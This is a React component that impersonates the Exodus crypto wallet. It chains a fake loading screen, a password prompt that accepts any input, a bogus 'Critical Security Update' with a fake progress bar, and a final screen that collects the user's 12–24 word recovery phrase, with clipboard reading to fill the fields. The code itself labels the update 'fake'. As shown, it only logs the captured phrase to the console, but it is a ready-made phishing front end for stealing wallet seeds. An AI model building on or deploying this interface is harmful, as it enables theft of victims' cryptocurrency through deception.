import React, { useState, useEffect } from 'react';

interface ExodusPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'update_prompt' | 'updating' | 'import';

export default function ExodusPanel({ isOpen, onClose }: ExodusPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phraseLength, setPhraseLength] = useState<12 | 18 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [updateProgress, setUpdateProgress] = useState(0);
  const [invalidCount, setInvalidCount] = useState(0);

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setShowPassword(false);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setUpdateProgress(0);
      setInvalidCount(0);

      // Exodus has a "Loading..." spinner splash screen
      const timer = setTimeout(() => setView('password'), 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake updating screen
  useEffect(() => {
    if (view === 'updating') {
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 15) + 5;
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          setTimeout(() => setView('import'), 600);
        }
        setUpdateProgress(progress);
      }, 300);
      return () => clearInterval(interval);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    let count = 0;
    newValues.slice(0, phraseLength).forEach(val => {
      if (val.length > 0 && !/^[a-z]+$/.test(val)) {
        count++;
      }
    });
    setInvalidCount(count);
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const words = text.toLowerCase().trim().split(/\s+/);
      const newValues = [...phraseValues];
      
      words.forEach((word, i) => {
        if (i < phraseLength) newValues[i] = word;
      });
      
      setPhraseValues(newValues);
      
      let count = 0;
      newValues.slice(0, phraseLength).forEach(val => {
        if (val.length > 0 && !/^[a-z]+$/.test(val)) count++;
      });
      setInvalidCount(count);
    } catch (err) {
      console.error('Failed to read clipboard: ', err);
    }
  };

  const handleClear = () => {
    setPhraseValues(Array(24).fill(''));
    setInvalidCount(0);
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && invalidCount === 0;
  };

  return (
    <>
      <div className={`fixed inset-0 z-[2147483648] font-sans ${isOpen ? 'pointer-events-auto' : 'pointer-events-none'}`}>
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#000000a0] backdrop-blur-sm transition-opacity duration-[400ms] ease-in-out ${isOpen ? 'opacity-100' : 'opacity-0'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal */}
        <div className={`flex transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[685px] md:border border-[#ffffff1a] md:rounded-xl overflow-hidden ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          
          {/* Exodus specific deep gradient background */}
          <div className="h-full w-full bg-gradient-to-b from-[#2a2444] to-[#120f1c] shadow-2xl relative overflow-hidden flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-110 blur-sm pointer-events-none'}`}>
              <div className="flex flex-col items-center justify-center w-full px-6">
                <div className="mb-8">
                  <ExodusLogoSVG className="w-[72px] h-[72px]" />
                </div>
                
                <div className="text-center mb-16">
                  <h3 className="text-[#ffffff] text-[24px] font-rubik font-light mb-1">Welcome back</h3>
                  <p className="text-[#ffffff80] text-[14px] font-rubik font-normal">Your wallet is secured</p>
                </div>

                <div className="flex justify-center items-center mb-16">
                  <div className="relative w-[60px] h-[60px] rounded-full bg-white/[0.01] shadow-[inset_0_0_20px_rgba(255,255,255,0.1)] flex items-center justify-center">
                    <svg viewBox="0 0 60 60" width="60" height="60" className="animate-spin duration-1000">
                      <linearGradient id="spinner-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stopColor="#6619FF"></stop>
                        <stop offset="100%" stopColor="#00BFFF"></stop>
                      </linearGradient>
                      <circle cx="30" cy="30" r="28" fill="none" strokeWidth="2.5" stroke="url(#spinner-gradient)" strokeLinecap="round" strokeDasharray="130" strokeDashoffset="40"></circle>
                    </svg>
                  </div>
                </div>

                <div className="text-center">
                  <p className="text-[#ffffff80] text-[16px] font-rubik font-light animate-pulse">Loading...</p>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col pt-12 px-6 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              {/* Subtle top background highlight */}
              <div className="absolute top-0 left-0 right-0 h-[22%] bg-gradient-to-b from-[#6619FF33] to-transparent pointer-events-none"></div>

              <div className="flex flex-col items-center justify-center mb-12 mt-12 relative z-10 shrink-0">
                <ExodusLogoSVG className="w-[72px] h-[72px] drop-shadow-[0_0_15px_rgba(102,25,255,0.5)]" />
              </div>
              
              <div className="flex flex-col items-center justify-center mb-12 text-center shrink-0">
                <h3 className="text-[#ffffff] text-[24px] font-rubik font-light mb-1">Welcome back</h3>
                <p className="text-[#ffffff80] text-[14px] font-rubik font-normal">Your wallet is secured</p>
              </div>
              
              <div className="flex flex-col w-full flex-1">
                <div className="relative w-full mb-6 shrink-0">
                  <input 
                    className="w-full h-[50px] py-[11px] pl-[20px] pr-[48px] text-[14px] font-normal rounded-[12px] text-[#ffffff] bg-[#00000033] shadow-[inset_0px_1px_0px_rgba(255,255,255,0.08)] focus:bg-[#00000066] outline-none transition-all duration-300 font-rubik placeholder-[#ffffff66]" 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button 
                    type="button" 
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-3.5 text-[#B3B3B3] hover:text-white transition-colors cursor-pointer"
                  >
                    {!showPassword ? (
                      <svg className="w-[20px] h-[20px]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                    ) : (
                      <svg className="w-[20px] h-[20px]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08c.421-.052.845-.08 1.27-.08 7 0 10 7 10 7a13.163 13.163 0 0 1-1.67 2.68M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"></path></svg>
                    )}
                  </button>
                </div>
                
                <div className="w-full shrink-0">
                  <button 
                    onClick={() => setView('update_prompt')}
                    disabled={password.length < 3}
                    className="w-full text-[#ffffff] bg-gradient-to-r from-[#00bfff] to-[#6619FF] font-medium font-rubik text-[14px] uppercase tracking-wide cursor-pointer rounded-full h-[50px] transition-all duration-300 hover:from-[#09bfff] hover:to-[#712aff] disabled:opacity-50 disabled:cursor-not-allowed shadow-[0_0_20px_rgba(102,25,255,0.3)] active:scale-[0.98]"
                  >
                    Unlock
                  </button>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATE PROMPT                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 flex flex-col px-6 py-6 transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'update_prompt' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center shrink-0 mb-4">
                <button className="flex items-center bg-white/5 border border-white/10 rounded-full h-10 w-10 justify-center hover:bg-white/10 transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><path d="M6 18L18 6M6 6l12 12"></path></svg>
                </button>
              </div>
              
              <div className="flex flex-col items-center justify-center flex-grow">
                <div className="mb-6 flex items-center justify-center">
                  <ExodusLogoSVG className="w-16 h-16 drop-shadow-[0_0_15px_rgba(102,25,255,0.4)]" />
                </div>
                
                <div className="flex flex-col items-center justify-center mb-6 text-center">
                  <h3 className="text-[#ffffff] text-[24px] font-rubik font-light mb-1">Update Available</h3>
                  <p className="text-[#ffffff80] text-[16px] font-rubik font-normal">Version 25.46.4</p>
                </div>

                <div className="w-full mb-6">
                  <div className="relative overflow-hidden rounded-[18px] bg-gradient-to-r from-[#6e47c9] to-[#2f437f] p-4 shadow-lg border border-white/5">
                    <div className="flex items-start">
                      <div className="relative mr-3 mt-1 shrink-0">
                        <div className="w-3 h-3 bg-[#00bfff] rounded-full"></div>
                        <div className="absolute inset-0 bg-[#00bfff] rounded-full animate-ping opacity-75"></div>
                      </div>
                      <div className="relative z-10">
                        <h3 className="text-white font-rubik font-medium text-[15px] mb-1">Critical Security Update</h3>
                        <p className="text-white text-opacity-80 font-rubik font-light text-[13px] leading-[18px]">This update includes essential security improvements to protect your assets and enhance your wallet functionality.</p>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div className="w-full mb-6">
                  <p className="text-[#ffffff] font-medium font-rubik text-[16px] mb-4">What's new</p>
                  <div className="space-y-3">
                    <div className="rounded-[12px] bg-[#252252] border border-[#3c3a61] overflow-hidden p-3.5">
                      <p className="text-[#ffffff] font-normal text-[14px] font-rubik">Enhanced security protocol for cross-chain transactions</p>
                    </div>
                    <div className="rounded-[12px] bg-[#252252] border border-[#3c3a61] overflow-hidden p-3.5">
                      <p className="text-[#ffffff] font-normal text-[14px] font-rubik">Fixed vulnerability in DApp connection system</p>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mt-auto shrink-0 pt-4">
                <button 
                  onClick={() => setView('updating')}
                  className="w-full text-[#ffffff] bg-gradient-to-r from-[#00bfff] to-[#6619FF] font-medium font-rubik text-[14px] uppercase tracking-wide cursor-pointer rounded-full h-[50px] transition-all duration-300 hover:opacity-90 shadow-[0_0_20px_rgba(102,25,255,0.3)] active:scale-[0.98]" 
                  type="button"
                >
                  Update now
                </button>
                <div className="text-center mt-4">
                  <a href="https://www.exodus.com/contact-support/" target="_blank" rel="noreferrer" className="text-[#ffffff80] text-[13px] font-rubik font-normal hover:underline hover:text-white transition-colors">Need help? Contact support</a>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: UPDATING STATE (PROGRESS BAR)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 transition-opacity duration-500 bg-[#14132b] ${view === 'updating' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="flex flex-col h-full items-center justify-center px-6">
                
                <div className="mb-10 relative">
                  <div className="relative h-24 w-24 flex items-center justify-center">
                    <div className="absolute inset-0 bg-gradient-to-r from-[#6619FF] to-[#00BFFF] rounded-full opacity-20 animate-pulse"></div>
                    <ExodusLogoSVG className="w-16 h-16 relative z-10" />
                  </div>
                </div>
                
                <div className="flex flex-col items-center justify-center mb-10 text-center">
                  <h4 className="font-rubik text-[#ffffff] font-light text-[24px] mb-2">Updating Exodus Wallet</h4>
                  <p className="font-rubik text-[#ffffff80] font-normal text-[15px]">Please wait while we update to version 25.46.4</p>
                </div>
                
                <div className="w-full max-w-md mb-8">
                  <div className="w-full h-1.5 bg-[#252252] rounded-full overflow-hidden">
                    <div className="h-full bg-gradient-to-r from-[#00bfff] to-[#6619FF] rounded-full transition-all duration-300" style={{ width: `${updateProgress}%` }}></div>
                  </div>
                  <div className="flex items-center justify-between mt-3">
                    <p className="font-rubik text-[#ffffff80] text-[13px] font-normal">Installing security update...</p>
                    <p className="font-rubik text-[#ffffff] text-[13px] font-medium">{updateProgress}%</p>
                  </div>
                </div>

                <div className="w-full max-w-md mb-8">
                  <div className="rounded-[12px] bg-[#252252] border border-[#3c3a61] p-4">
                    <div className="flex items-start">
                      <svg className="w-6 h-6 text-[#00bfff] mr-3 shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M9 12L11 14L15 10M12 3L4 7V12C4 16.0993 7.22383 19.8408 12 21C16.7762 19.8408 20 16.0993 20 12V7L12 3Z" strokeLinecap="round" strokeLinejoin="round"></path></svg>
                      <div>
                        <p className="font-rubik text-[#ffffff] font-medium text-[14px] mb-1">Enhanced security protocol</p>
                        <p className="font-rubik text-[#ffffff80] font-light text-[13px] leading-[18px]">Your funds remain secure during this update process. Please do not close this window.</p>
                      </div>
                    </div>
                  </div>
                </div>
                
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-50 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col bg-gradient-to-b from-[#2a2444] to-[#120f1c] ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center px-4 pt-4 shrink-0">
                <button className="flex items-center bg-white/5 border border-white/10 rounded-full h-10 w-10 justify-center hover:bg-white/10 transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                  <svg className="w-5 h-5 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><path d="M6 18L18 6M6 6l12 12"></path></svg>
                </button>
              </div>

              <div className="flex items-center justify-center mb-6 shrink-0 mt-2">
                <ExodusLogoSVG className="w-14 h-14" />
              </div>

              <div className="flex flex-col items-center justify-center text-center px-6 mb-6 shrink-0">
                <h3 className="text-[#ffffff] text-[24px] font-rubik font-light mb-1">Import with recovery phrase</h3>
                <p className="text-[#ffffff80] text-[15px] font-rubik font-normal">Type or paste your {phraseLength}-word recovery phrase</p>
              </div>

              {/* 12 / 18 / 24 Toggle */}
              <div className="flex justify-center mb-4 px-6 shrink-0">
                <div className="flex gap-x-2 p-1 w-full bg-[#00000033] rounded-full shadow-[inset_0px_1px_0px_rgba(255,255,255,0.08)]">
                  {[12, 18, 24].map((num) => (
                    <button 
                      key={num}
                      type="button" 
                      onClick={() => { setPhraseLength(num as 12|18|24); setPhraseValues(Array(24).fill('')); setInvalidCount(0); }}
                      className={`py-1.5 px-2 rounded-full text-[13px] font-medium font-rubik transition-all w-full ${phraseLength === num ? 'bg-[#111] text-white shadow-md border border-white/10' : 'text-[#ffffff80] hover:text-white border border-transparent'}`}
                    >
                      {num} words
                    </button>
                  ))}
                </div>
              </div>

              {/* Grid */}
              <div className="px-5 max-h-[300px] overflow-y-auto exodus-scrollbar flex-1 pb-2">
                <div className={`grid gap-2.5 ${phraseLength === 12 ? 'grid-cols-2 sm:grid-cols-3' : 'grid-cols-3'}`}>
                  {Array.from({ length: phraseLength }).map((_, i) => {
                    const isError = phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]);
                    return (
                      <div key={i} className="relative group">
                        <div className="absolute left-[12px] top-[12px] pointer-events-none">
                          <p className="font-rubik text-[#ffffff] opacity-40 text-[13px] font-normal group-focus-within:opacity-100 transition-opacity">{i + 1}</p>
                        </div>
                        <input 
                          className={`w-full h-[42px] py-[10px] pl-[34px] pr-[8px] text-[14px] font-normal rounded-[12px] text-[#ffffff] outline-none transition-all duration-300 font-rubik ${isError ? 'bg-[#ff1a6620] shadow-[inset_0px_0px_0px_1px_#ff1a66] focus:bg-[#ff1a6630]' : 'bg-[#00000033] shadow-[inset_0px_1px_0px_rgba(255,255,255,0.08)] focus:bg-[#00000066] focus:shadow-[inset_0px_0px_0px_1px_#00bfff]'}`} 
                          type="text" 
                          value={phraseValues[i]}
                          onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                        />
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Error Label */}
              <div className={`px-6 mt-2 mb-2 transition-opacity duration-300 min-h-[18px] text-center shrink-0 ${invalidCount > 0 ? 'opacity-100' : 'opacity-0'}`}>
                <p className="text-[#ff1a66] text-[13px] font-normal font-rubik">{invalidCount} word{invalidCount > 1 ? 's are' : ' is'} invalid or misspelled</p>
              </div>

              {/* Paste/Clear Buttons */}
              <div className="flex items-center justify-between px-6 mb-4 gap-x-3 shrink-0">
                <button onClick={handlePaste} className="flex-1 bg-white/5 hover:bg-white/10 border border-white/10 rounded-[12px] py-2 flex items-center justify-center gap-x-2 transition-all active:scale-95">
                  <svg className="w-4 h-4 text-[#00bfff]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>
                  <span className="text-white text-[13px] font-rubik">Paste</span>
                </button>
                <button onClick={handleClear} className="flex-1 bg-white/5 hover:bg-white/10 border border-white/10 rounded-[12px] py-2 flex items-center justify-center gap-x-2 transition-all active:scale-95">
                  <svg className="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6 6 18M6 6l12 12"></path></svg>
                  <span className="text-white text-[13px] font-rubik">Clear</span>
                </button>
              </div>

              {/* Proceed Button */}
              <div className="px-6 pb-6 mt-auto shrink-0">
                <button 
                  className="w-full text-[#ffffff] bg-gradient-to-r from-[#00bfff] to-[#6619FF] font-medium font-rubik text-[14px] uppercase tracking-wide cursor-pointer rounded-full h-[50px] transition-all duration-300 hover:from-[#09bfff] hover:to-[#712aff] disabled:opacity-50 disabled:cursor-not-allowed shadow-[0_0_20px_rgba(102,25,255,0.3)] active:scale-[0.98]" 
                  disabled={!isPhraseComplete()}
                  onClick={() => {
                    console.log("Exodus Import Complete:", phraseValues.slice(0, phraseLength));
                    onClose();
                  }}
                >
                  Continue
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .exodus-scrollbar::-webkit-scrollbar { width: 4px; }
        .exodus-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .exodus-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 10px; }
        .exodus-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.4); }
        
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}} />
    </>
  );
}

// -------------------------------------------------------------------
// EXODUS SVG COMPONENTS
// -------------------------------------------------------------------

const ExodusLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M11.928 3.35 6.818 0v1.873l3.278 2.13-.386 1.22H6.818v1.553H9.71l.386 1.22-3.278 2.13V12l5.11-3.34-.836-2.655.836-2.654Z" fill="url(#exodus-grad-1)"></path>
    <path d="M2.372 6.776h2.882V5.224H2.36l-.375-1.22 3.268-2.13V0L.144 3.35l.835 2.655L.144 8.66 5.264 12v-1.873l-3.278-2.13.386-1.22Z" fill="url(#exodus-grad-2)"></path>
    <defs>
      <linearGradient id="exodus-grad-1" x1="10.275" y1="12.825" x2="6.852" y2="-1.318" gradientUnits="userSpaceOnUse">
        <stop stopColor="#0B46F9"></stop>
        <stop offset="1" stopColor="#BBFBE0"></stop>
      </linearGradient>
      <linearGradient id="exodus-grad-2" x1="10.275" y1="12.825" x2="6.852" y2="-1.318" gradientUnits="userSpaceOnUse">
        <stop stopColor="#0B46F9"></stop>
        <stop offset="1" stopColor="#BBFBE0"></stop>
      </linearGradient>
    </defs>
  </svg>
);